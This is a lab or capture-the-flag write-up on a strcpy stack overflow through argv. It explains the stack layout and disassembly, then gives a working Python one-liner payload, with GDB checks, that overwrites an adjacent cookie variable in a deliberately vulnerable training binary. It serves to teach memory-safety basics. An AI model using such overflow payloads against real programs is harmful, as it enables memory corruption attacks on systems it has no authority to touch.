# ex01 — Stack Overflow into a Variable (via `argv`)

## Goal

Overwrite a `cookie` variable with the exact value `0x61626364` to make the program print:

```
you have correctly got the variable to the right value
```

## Concept

This challenge is similar to ex00, but the input comes from **command-line arguments** (`argv[1]`) instead of `stdin`. The unsafe function is `strcpy()`, which copies a source string to a destination buffer with **no bounds checking**.

### Why `strcpy()` is dangerous

`strcpy(dest, src)` copies bytes from `src` to `dest` until it encounters a NUL byte (`\x00`). It does not check whether `dest` is large enough to hold the copied data. If `src` is longer than `dest`, the extra bytes overflow into adjacent memory.

## Memory Layout

```
Higher addresses
┌─────────────────────────────┐
│  cookie (4 bytes)           │  [esp+0x5c]  ← target: must be 0x61626364
├─────────────────────────────┤
│  ... (padding)              │
├─────────────────────────────┤
│  buffer (64 bytes)          │  [esp+0x1c]  ← strcpy writes here
├─────────────────────────────┤
│  ...                        │
Lower addresses
```

The cookie is at `[esp+0x5c]`, exactly 64 bytes after the buffer at `[esp+0x1c]`.

## Relevant Assembly (`main`)

```asm
0804846a <main>:
    sub    esp, 0x60                  ; allocate stack space

    mov    DWORD PTR [esp+0x5c], 0x0  ; cookie = 0

    mov    eax, DWORD PTR [ebp+0xc]   ; eax = argv
    add    eax, 0x4                  ; eax = &argv[1]
    mov    eax, DWORD PTR [eax]       ; eax = argv[1] (pointer to string)
    mov    DWORD PTR [esp+0x4], eax   ; arg2 = argv[1]

    lea    eax, [esp+0x1c]            ; eax = &buffer[0]
    mov    DWORD PTR [esp], eax       ; arg1 = buffer
    call   strcpy                     ; strcpy(buffer, argv[1]) — NO BOUNDS CHECK

    mov    eax, DWORD PTR [esp+0x5c]  ; eax = cookie
    cmp    eax, 0x61626364            ; compare with expected value
    jne    ...                        ; if not equal, fail
```

### Step-by-step analysis

| Instruction | What it does |
|---|---|
| `mov [esp+0x5c], 0x0` | Initializes `cookie = 0` |
| `mov eax, [ebp+0xc]` | Gets `argv` pointer |
| `add eax, 0x4` | Points to `argv[1]` |
| `call strcpy` | Copies `argv[1]` into the 64-byte buffer |
| `cmp eax, 0x61626364` | Checks if cookie equals `0x61626364` |

## Exploit

The expected value `0x61626364` corresponds to ASCII `"abcd"` (in little-endian, the bytes in memory are `64 63 62 61` = `"dcba"`):

```bash
./bin "$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\x64\x63\x62\x61")')"
```

### Why it works

- Bytes 1–64 (`"A"` × 64): Fill the buffer
- Bytes 65–68 (`\x64\x63\x62\x61`): Overwrite `cookie` in memory
- In little-endian, the bytes `64 63 62 61` are interpreted as the 32-bit integer `0x61626364`
- The comparison `cmp eax, 0x61626364` succeeds

### Little-endian explanation

```
Memory address:  [esp+0x5c]  [esp+0x5d]  [esp+0x5e]  [esp+0x5f]
Byte value:       0x64        0x63        0x62        0x61
ASCII:            'd'         'c'         'b'         'a'

As a 32-bit integer (little-endian): 0x61626364
```

## GDB Verification

```bash
gdb -q ./bin
```

```gdb
# Break after strcpy returns
break *0x080484a7
run "$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\x64\x63\x62\x61")')"

# Check the cookie value
x/wx $esp+0x5c
# Output: 0x61626364

# Check the buffer contents
x/16xb $esp+0x1c
# Output: 0x41  0x41  0x41  0x41 ...

# Check the bytes at the cookie location
x/4xb $esp+0x5c
# Output: 0x64  0x63  0x62  0x61

# Continue to see success
continue
```

## Key Takeaway

`strcpy()` is never safe with untrusted input. Use `strncpy(dest, src, size)` or `strlcpy()` which limit the number of bytes copied. The key difference from ex00 is the input source (`argv` vs `stdin`) and the target value (specific integer vs any non-zero).
